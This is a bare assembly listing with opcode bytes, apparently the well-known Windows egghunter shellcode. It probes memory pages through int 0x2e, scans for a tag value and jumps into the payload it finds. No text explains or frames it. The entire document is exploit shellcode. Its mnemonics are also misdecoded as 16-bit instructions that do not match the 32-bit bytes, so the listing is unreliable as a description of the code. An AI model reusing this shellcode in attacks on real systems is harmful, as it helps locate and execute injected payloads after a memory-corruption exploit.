; 00000000  6681CAFF0F4252    or edx,0x52420fff
; 00000007  6A02              push byte +0x2
; 00000009  58                pop ax
; 0000000A  CD2E              int 0x2e
; 0000000C  3C05              cmp al,0x5
; 0000000E  5A                pop dx
; 0000000F  74EF              jz 0x0
; 00000011  B8626F            mov ax,0x6f62
; 00000014  6B758BFA          imul si,[di-0x75],byte -0x6
; 00000018  AF                scasw
; 00000019  75EA              jnz 0x5
; 0000001B  AF                scasw
; 0000001C  75E7              jnz 0x5
; 0000001E  FFE7              jmp di


    or edx,0x52420fff
    push byte +0x2
    pop ax
    int 0x2e
    cmp al,0x5
    pop dx
    jz 0x0
    mov ax,0x6f62
    imul si,[di-0x75],byte -0x6
    scasw
    jnz 0x5
    scasw
    jnz 0x5
    jmp di
        
